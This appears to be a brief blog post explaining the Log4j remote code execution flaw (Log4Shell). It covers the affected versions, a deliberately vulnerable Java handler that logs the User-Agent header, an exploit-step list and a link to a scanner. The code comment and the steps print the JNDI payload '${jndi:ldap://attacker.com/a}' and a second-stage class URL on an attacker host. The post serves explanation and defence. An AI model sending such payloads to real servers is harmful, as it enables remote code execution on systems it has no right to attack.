---
layout: post
title:  "Log4J Remote Code Execution"
date:   2021-12-10 19:56:00 +0800
---

# [Reference](https://www.lunasec.io/docs/blog/log4j-zero-day/)

# Affected Apache log4j Version
2.0 <= Apache log4j <= 2.14.1

{% highlight Java %}
import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(log4jExample.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * This is basically pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */ 
  public void handle(HttpExchange he) throws IOException {
    string userAgent = he.getRequestHeader("user-agent");
    
    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
    log.info("Request User Agent:" + userAgent);

    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
{% endhighlight %}

# Exploit Steps​
* Data from the User gets sent to the server (via any protocol),
* The server logs the data in the request, containing the malicious payload: ${jndi:ldap://attacker.com/a} (where attacker.com is an attacker controlled server),
* The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via "Java Naming and Directory Interface" (JNDI),
* This response contains a path to a remote Java class file (ex. http://second-stage.attacker.com/Exploit.class) which is injected into the server process,
* This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

# Scan Tool: [log4j-scanner](https://github.com/cisagov/log4j-scanner)